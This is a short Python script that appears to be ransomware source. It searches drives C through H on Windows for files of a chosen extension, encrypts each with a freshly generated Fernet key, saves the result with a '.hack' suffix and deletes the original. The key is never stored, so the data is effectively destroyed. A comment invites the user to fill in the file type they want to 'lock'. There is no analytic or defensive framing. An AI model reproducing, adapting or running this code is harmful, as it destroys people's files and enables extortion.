from cryptography.fernet import Fernet
from subprocess import check_output
import os

# generating a key

key = Fernet.generate_key()

encryption_deploy = Fernet(key)


  #print(cmd)


list_of_dir = ['F', 'H', 'G', 'C', 'D', 'E']
for i in list_of_dir:
    #print(i)
    try:
        # clear 'wirite here your file type' then incept write type of file that you want to lock it. but do not clean dot (.) and (*)
        cmd = check_output( i +': && dir /S /B *.write here your file type', shell=True).decode().split('\n')
        print(cmd)
        cmd = cmd[:-1]
        for i in cmd:
            i = i[:-1]
            with open(i, 'rb') as file:
                reading_data = file.read()
                enc_file = encryption_deploy.encrypt(reading_data)
                new_file = open(i + '.hack', 'wb')
                new_file.write(enc_file)
                file.close()
                new_file.close()
                os.remove(i)
    except:
        pass
